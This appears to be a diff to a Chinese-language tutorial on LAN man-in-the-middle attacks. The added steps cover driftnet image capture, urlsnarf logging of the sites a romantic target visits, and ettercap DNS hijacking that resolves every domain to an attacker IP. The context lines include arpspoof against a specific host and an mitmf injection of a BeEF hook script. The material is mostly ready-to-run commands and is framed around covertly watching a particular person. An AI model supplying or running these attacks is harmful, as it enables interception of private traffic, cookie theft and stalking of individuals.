@@ -25,6 +25,8 @@ arpspoof -t 192.168.1.105 192.168.1.1 -i eth0
 
 **ettercap使用**
 
+SSLstrip ssl加密链接嗅探
+
 使用 ettercap嗅探。可以使用GUI视图窗口来进行操作，或者使用命令行下的命令来使用。这里介绍下 ettercap在GUI模式下的使用步骤
 
 1. 使用 etteracp -G 开启程序主界面。
@@ -40,12 +42,40 @@ arpspoof -t 192.168.1.105 192.168.1.1 -i eth0
 
 ## 0x3 图片获取
 
+### driftnet使用
+
 这里使用我们还可以使用driftnet截获受害者浏览的图片。driftnet -eth0 (系统使用的网卡名称)
 在系统菜单中打开终端，输入 driftnet -i eth0 ，弹出driftnet，如果有图片的数据包流过，就会把图像显示出来 。
 
 单击图片会保存到root更目录下，或者使用driftnet -i eth0 -a 命令显示图片名称，这样图片名称会在终端命令行中显示出来，并保存图片到目录中。当然你也可以修改图片保存目录。
 
+语法： driftnet   [options]   [filter code]
 
+主要参数：
+
+ -b               捕获到新的图片时发出嘟嘟声
+
+-i  interface     选择监听接口
+
+-f  file   读取一个指定pcap数据包中的图片
+
+-p  不让所监听的接口使用混杂模式
+
+-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）
+
+-m number 指定保存图片数的数目
+
+-d directory  指定保存图片的路径
+
+-x prefix  指定保存图片的前缀名
+
+### 其他使用技巧
+
+**抓取url**
+再打开一个终端，输入urlsnarf -i wlan0 监听女神浏览过的网页日志，等待获取
+
+**抓取数据包**
+再打开一个终端，输入wireshark ，进行抓包
 
 ## 0x4 cooick 获取
 使用 Coocike Cadger工具进行
@@ -171,6 +201,25 @@ gnome-terminal -x bash -c "mitmf -i at0 --inject --js-url http://10.0.0.1:3000/h
 beef-xss
 
 ```
+
+这里用到DNS劫持
+先搭建个表白网页，如在：192.168.1.102
+修改ettercap的DNS配置文件
+[AppleScript] 纯文本查看 复制代码
+?
+sudo vim /etc/ettercap/etter.dns
+
+最后的注释上面加上
+[AppleScript] 纯文本查看 复制代码
+?
+* A 192.168.1.102
+
+即把所有域名解析到这个ip
+然后加载dns_spoof插件开始欺骗
+[AppleScript] 纯文本查看 复制代码
+?
+ettercap -T -i wlan0 -q -P dns_spoof /// ///
+
 ## 内网信息获取
 
 使用 Windows自带的命令进行内网信息的查看，这里只是初步查看内网的信息。
